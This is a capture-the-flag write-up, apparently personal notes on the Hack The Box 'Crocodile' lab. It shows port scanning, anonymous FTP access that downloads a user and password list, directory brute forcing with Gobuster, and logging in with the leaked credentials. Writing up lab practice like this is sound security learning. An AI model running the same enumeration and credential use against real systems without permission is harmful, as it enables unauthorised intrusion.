- - - 
created : 31-07-2025 

Tags : #veryeasy
- - - 
# Objective

Learn how to start.
# CONNECT

To attack the target machine, you must be on the same network.  
Connect to the Starting Point VPN using one of the following options.

It may take a minute for HTB to recognize your connection.  
If you don't see an update after 2-3 minutes, refresh the page.

I will use OpenVPN, so i download the config file, go in the same directory and execute the following command :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB]
└─$ sudo openvpn starting_point_mdn0x.ovpn 
[sudo] password di mdn0x: 
```

We can start our [Vulnerable Machine](../../../../3%20-%20Tags/Hacking%20Concepts/Vulnerable%20Machine.md).

Now we add the target IP to our /etc/hosts file, so we don't have to remember the [IP address](../../../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) every time :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Meow]
└─$ sudo nano /etc/hosts
```

We add a line with the given IP and a name .
# Task 1

What Nmap scanning switch employs the use of default scripts during a scan?

```bash
  sC
```
# Task 2

What service version is found to be running on port 21?
## Rustscan/Nmap

We can use [Rustscan](../../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Crocodile]
└─$ rustscan -a crocodile.htb -- -sC  
 
Open 10.129.188.173:21
Open 10.129.188.173:80

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.231
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    syn-ack ttl 63
|_http-favicon: Unknown favicon MD5: 1248E68909EAE600881B8DB1AD07F356
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Smash - Bootstrap Business Template

```

So the answer is :

```bash
  vsFTPd 3.0.3
```
# Task 3

What FTP code is returned to us for the "Anonymous FTP login allowed" message?

```bash
 230
```
# Task 4

After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?

```bash
 anonymous 
```
# Task 5

After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?

```bash
  get
```
# Task 6

What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?

## Enum FTP (21)

We log in as anonymous (blank passwd) and dowload the file :

```bash
 ┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Crocodile]
└─$ ftp anonymous@crocodile.htb


Connected to crocodile.htb.
220 (vsFTPd 3.0.3)

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Entering Extended Passive Mode (|||45948|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.

ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||43188|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |**********************************************************************************************************|    62       32.56 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.53 KiB/s)


ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||42883|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |**********************************************************************************************************|    33      354.13 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.10 KiB/s)

```

Now we can exit with `bye` and cat the file :

```bash
ftp> bye

221 Goodbye.                                   
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Crocodile]
└─$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
```

The answer is `admin`.
# Task 7

What version of Apache HTTP Server is running on the target host?

We look at the previous scan, we don't have the info so we visit the main page http://IP_MACHINE/something :

![Pasted image 20250731162317.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250731162317.png)

```bash
 Apache httpd 2.4.41
```
# Task 8

What switch can we use with Gobuster to specify we are looking for specific filetypes?

```bash
  -x
```
# Task 9

Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?
## Gobuster

We'll use [Gobuster](../../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to enumerate the directories :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Crocodile]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://crocodile.htb -x php

/.php                 (Status: 403) [Size: 278]
/login.php            (Status: 200) [Size: 1577]
/assets               (Status: 301) [Size: 315] [--> http://crocodile.htb/assets/]
/css                  (Status: 301) [Size: 312] [--> http://crocodile.htb/css/]
/js                   (Status: 301) [Size: 311] [--> http://crocodile.htb/js/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 314] [--> http://crocodile.htb/fonts/]
/dashboard            (Status: 301) [Size: 318] [--> http://crocodile.htb/dashboard/]
```

The answer is `login.php`.
# Submit Flag

We can cat the other file from [FTP](../../../../3%20-%20Tags/Hacking%20Concepts/FTP.md) to see the admin password :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Crocodile]
└─$ cat allowed.userlist.passwd 
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

Now we can use the credentials on the login page : 

![Pasted image 20250731163231.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250731163231.png)

And we retrieve the flag.
